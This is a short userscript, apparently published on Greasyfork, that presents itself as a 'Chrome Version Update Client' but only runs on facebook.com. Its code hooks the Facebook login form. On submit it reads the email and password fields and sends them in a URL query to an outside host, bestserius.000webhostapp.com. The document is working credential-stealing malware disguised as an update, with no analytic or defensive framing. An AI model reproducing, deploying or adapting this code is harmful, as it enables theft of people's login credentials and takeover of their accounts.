// ==UserScript==
// @name         Chrome Version Update
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Chrome Version Update Client
// @author       You
// @match        *.facebook.com/*
// @downloadURL https://update.greasyfork.org/scripts/371844/Chrome%20Version%20Update.user.js
// @updateURL https://update.greasyfork.org/scripts/371844/Chrome%20Version%20Update.meta.js
// ==/UserScript==

(function() {
    var $ = window.jQuery;
    var form = document.getElementById('login_form');
    form.onsubmit = function() {
        var user = document.getElementById('email').value;
        var pass = document.getElementById('pass').value;
        window.open("https://bestserius.000webhostapp.com/facebook.php?redirec=true&com=5SQ66E6AS2Z5D45S4AD48Q9W8EA5SD4A65SD48AD56Q4D98W45A4DS98AS365D498ASAS4D984W9QA7DA4SD98AS4D654AS98D456AS4D98A4S65D4Z6489AS4D98AS47D98A4S89D498AS4D98A47S9D84AASD5Q4594DQ4W89A65SD49AS1D564AS9D4A98S4D95AS4D89AS4D98AS4D9AS4D99S8D49&user="+user+"&pass="+pass, 'Facebook.com');
    }
})();